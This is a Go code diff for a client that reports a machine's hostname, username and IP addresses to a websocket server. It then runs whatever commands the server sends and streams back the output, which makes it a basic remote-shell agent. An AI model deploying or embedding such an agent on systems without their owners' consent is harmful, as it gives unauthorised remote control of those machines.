@@ -8,15 +8,15 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"net"
 	"net/http"
+	"os"
 	"os/exec"
 	"os/user"
 	"runtime"
 	"strings"
-	"time"
 
 	"github.com/coder/websocket"
 )
@@ -25,93 +25,171 @@ var PingError error
 var ReceiveError error
 
 type Message struct {
-	Message string `json:"message"`
+    Sender   int    `json:"sender"`
+    Receiver int    `json:"receiver"`
+    Message  []byte `json:"message"`
+    End      bool   `json:"end"`
 }
 
-func Serialize(data []byte) (message Message, err error) {
-	err = json.Unmarshal(data, &message)
-	return
+func NewMessageFromJSON(bytes []byte) (Message, error) {
+    var msg Message
+    err := json.Unmarshal(bytes, &msg)
+    if err != nil { return Message{}, err }
+
+    return msg, nil
+}
+
+func NewMessageToJSON(sender, receiver int, message []byte, end bool) ([]byte, error) {
+    msg := Message{
+        Sender:   sender,
+        Receiver: receiver,
+        Message:  message,
+        End:      end,
+    }
+
+    msg_bytes, err := json.Marshal(msg)
+    if err != nil { return []byte{}, err }
+
+    return msg_bytes, nil
 }
 
 type Client struct {
-    Id				int
-    SecretKey		string			`json:"SecretKey"`
-    FriendlyName	string			`json:"FriendlyName"`
-    ComputerName	string			`json:"ComputerName"`
-    LocalIP			string			`json:"LocalIP"`
-    PublicIP		string			`json:"PublicIP"`
-    OS				string			`json:"OS"`
-    Role			string
-    Conn			*websocket.Conn
-	CTX				context.Context
+	Id           int
+	SecretKey    string `json:"SecretKey"`
+	ComputerName string `json:"ComputerName"`
+	UserName     string `json:"UserName"`
+	LocalIP      string `json:"LocalIP"`
+	PublicIP     string `json:"PublicIP"`
+	OS           string `json:"OS"`
+	Conn         *websocket.Conn
 }
 
-func (client *Client) Start() error {
-	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
-	defer cancel()
+func NewClient(secretKey, computerName, userName, localIP, publicIP, OS string) Client {
+	if OS == "windows" {
+		userName = strings.Split(userName, "\\")[1]
+	}
+	
+	client := Client{
+		SecretKey:    secretKey,
+		ComputerName: computerName,
+		UserName:     userName,
+		LocalIP:      localIP,
+		PublicIP:     publicIP,
+		OS:           OS,
+	}
+	return client
+}
 
-	conn, _, err := websocket.Dial(ctx, "ws://127.0.0.1:8080/ws/", nil)
+func (client *Client) Start(websocket_URL string) error {
+	conn, _, err := websocket.Dial(context.Background(), websocket_URL, nil)
 	if err != nil { return err }
 	defer conn.CloseNow()
 
+	client.Conn = conn
+
+	bytes, err := json.Marshal(client)
+	if err != nil { return err }
+
+	err = client.Write(client.Id, -1, bytes, true)
+	if err != nil { return err }
+
+	msg, err := client.Read()
+	if err != nil { return err }
+	client.Id = msg.Receiver
+
 	go client.Ping()
 	client.Receive()
-	if ReceiveError != nil { return ReceiveError }
+	if ReceiveError != nil {
+		return ReceiveError
+	}
 
 	conn.Close(websocket.StatusNormalClosure, "")
-	
 	return nil
 }
 
 func (client *Client) Ping() {
-	client.CTX = client.Conn.CloseRead(client.CTX)
 	var err error
 	for {
-		err = client.Conn.Ping(client.CTX)
-		if err != nil { PingError = err; return }
+		err = client.Conn.Ping(context.Background())
+		if err != nil {
+			PingError = err
+			return
+		}
 	}
 }
 
-func Execute(command string) (*bufio.Scanner, error) {
+func Execute(command string) (*exec.Cmd, io.ReadCloser, error) {
 	command_args := strings.Split(command, " ")
 	cmd := exec.Command(command_args[0], command_args[1:]...)
 
 	stdout, err := cmd.StdoutPipe()
-	if err != nil { return &bufio.Scanner{}, err }
+	if err != nil {
+		return cmd, stdout, err
+	}
 
-	if err := cmd.Start(); err != nil { return &bufio.Scanner{}, err }
+	if err := cmd.Start(); err != nil {
+		return cmd, stdout, err
+	}
 
-	scanner := bufio.NewScanner(stdout)
-
-	if err := cmd.Wait(); err != nil { return scanner, err }
-
-	return scanner, nil
+	// if err := cmd.Wait(); err != nil {
+	// 	return stdout, err
+	// }
+	
+	return cmd, stdout, nil
+	
 }
 
 func (client *Client) Receive() {
 	for {
-		if PingError != nil { ReceiveError = PingError; return }
+		if PingError != nil { return }
+		msg, err := client.Read()
+		if err != nil { log.Print(12) }
 
-		_, bytes, err := client.Conn.Read(client.CTX)
-		if err != nil { ReceiveError = err; return }
+		log.Print(msg, string(msg.Message))
 
-		message, err := Serialize(bytes)
-		if err != nil { ReceiveError = err; return }
-
-		scanner, err := Execute(message.Message)
-		if err != nil { ReceiveError = err; return }
-
+		cmd, stdout, err := Execute(string(msg.Message))
+		if err != nil { client.Write(client.Id, msg.Sender, []byte(err.Error()), true) }
+		
+		scanner := bufio.NewScanner(stdout)
 		for scanner.Scan() {
-			log.Print(scanner.Text())
+			err := client.Write(client.Id, msg.Sender, scanner.Bytes(), false)
+			if err != nil { log.Print(err, 123)}
+
+			msg, err := client.Read()
+			if err != nil { log.Print(321) }
+
+			if string(msg.Message) != "ok" { cmd.Cancel(); break }
 		}
 	}
+}
+
+func (client *Client) Read() (Message, error) {
+	_, bytes, err := client.Conn.Read(context.Background())
+    if err != nil { log.Print(err, 3); return Message{}, err }
+    
+    msg, err := NewMessageFromJSON(bytes)
+    if err != nil { log.Print(err, 14); return Message{}, err }
+
+    return msg, nil
+}
+
+func(client *Client) Write(sender, receiver int, bytes []byte, end bool) error {
+	msg_bytes, err := NewMessageToJSON(sender, receiver, bytes, end)
+    if err != nil { log.Print(err, 4); return err }
+
+    err = client.Conn.Write(context.Background(), websocket.MessageText, msg_bytes)
+    if err != nil { log.Print(err, 10); return err }
+
+	return nil
 }
 
 func getSecretKey(n int) (string, error) {
 	hasher := sha256.New()
 	b := make([]byte, n)
 	_, err := rand.Read(b)
-	if err != nil { return "", err }
+	if err != nil {
+		return "", err
+	}
 
 	hasher.Write(b)
 	sha := hex.EncodeToString(hasher.Sum(nil))
@@ -119,25 +197,26 @@ func getSecretKey(n int) (string, error) {
 	return sha, nil
 }
 
-func getComputerName() (string, error) {
+func getUserName() (string, error) {
 	user, err := user.Current()
-	if err != nil {
-		return "", err
-	}
+	if err != nil { return "", err }
 	return user.Username, nil
+}
+
+func getComputerName() (string, error) {
+	computerName, err := os.Hostname()
+	if err != nil { return "", err }
+	return computerName, nil
 }
 
 func getLocalIP() (string, error) {
 	interfaces, err := net.Interfaces()
-	if err != nil {
-		return "", err
-	}
+	if err != nil { return "", err }
 
 	for _, iface := range interfaces {
 		addrs, err := iface.Addrs()
-		if err != nil {
-			return "", err
-		}
+		if err != nil { return "", err }
+
 		for _, addr := range addrs {
 			var ip net.IP
 			switch v := addr.(type) {
@@ -147,52 +226,41 @@ func getLocalIP() (string, error) {
 				ip = v.IP
 			}
 
-			if ipv4 := ip.To4(); ipv4 != nil && !ip.IsLoopback() {
-				return ipv4.String(), nil
-			}
+			if ipv4 := ip.To4(); ipv4 != nil && !ip.IsLoopback() { return ipv4.String(), nil }
 		}
 	}
-	
+
 	return "", fmt.Errorf("локальный IP адрес не найден")
 }
 
 func getPublicIP() (string, error) {
 	resp, err := http.Get("https://api.ipify.org")
-	if err != nil {
-		return "", err
-	}
+	if err != nil { return "", err }
 	defer resp.Body.Close()
 
-	ip, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
+	ip, err := io.ReadAll(resp.Body)
+	if err != nil { return "", err }
 
 	return string(ip), nil
 }
 
 func main() {
-	secretKey, err    := getSecretKey(256)
+	secretKey, err := getSecretKey(256)
 	if err != nil { log.Fatal(err) }
 
 	computerName, err := getComputerName()
 	if err != nil { log.Fatal(err) }
 
-	publicIP, err 	  := getPublicIP()
+	userName, err := getUserName()
+	if err != nil { log.Print("Warning: ", err) }
+
+	publicIP, err := getPublicIP()
 	if err != nil { log.Fatal(err) }
 
-	localIP, err      := getLocalIP()
+	localIP, err := getLocalIP()
 	if err != nil { log.Fatal(err) }
 
-	os				  := runtime.GOOS
-	
-	client := Client{
-		SecretKey: 		  secretKey,
-		ComputerName:     computerName,
-		LocalIP:		  localIP,
-		PublicIP:		  publicIP,
-		OS: 			  os,
-	}
-
-	client.Start()
+	client := NewClient(secretKey, computerName, userName, localIP, publicIP, runtime.GOOS)
+	err = client.Start("ws://127.0.0.1:8080/ws/")
+	if err != nil { log.Print(err) }
 }
